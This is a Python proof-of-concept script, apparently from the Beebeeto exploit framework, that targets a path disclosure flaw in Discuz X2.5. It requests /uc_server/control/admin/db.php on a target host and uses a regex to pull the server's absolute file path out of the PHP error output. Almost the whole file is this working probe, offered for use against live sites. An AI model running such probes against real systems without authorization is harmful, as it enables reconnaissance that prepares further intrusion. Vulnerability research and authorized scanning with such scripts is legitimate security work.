#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import requests

from baseframe import BaseFrame

class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0113',
            'name': 'Discuz X2.5 /uc_server/control/admin/db.php 路径泄露漏洞 POC',
            'author': 'pikachu',
            'create_date': '2015-06-23',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Discuz',
            'vul_version': ['X2.5'],
            'type': 'Information Disclosure',
            'tag': ['Discuz信息泄漏漏洞', 'Information Disclosure', 'php'],
            'desc': 'discuz X2.5 存在多处绝对路径泄露。',
            'references': ['N/A',
            ],
        },
    }
    
    @classmethod
    def verify(cls, args):
        payload = r'/uc_server/control/admin/db.php'
        verify_url = args['options']['target'] + payload
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
            print '[*] GET: ' + payload
        req = requests.get(verify_url)
        pathinfo = re.compile(r'not found in <b>(.*)</b> on line')
        match = pathinfo.findall(req.content)
        if match:
            path = match[0]
            args['success'] = True
            args['poc_ret']['path'] = path
        return args
        
    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())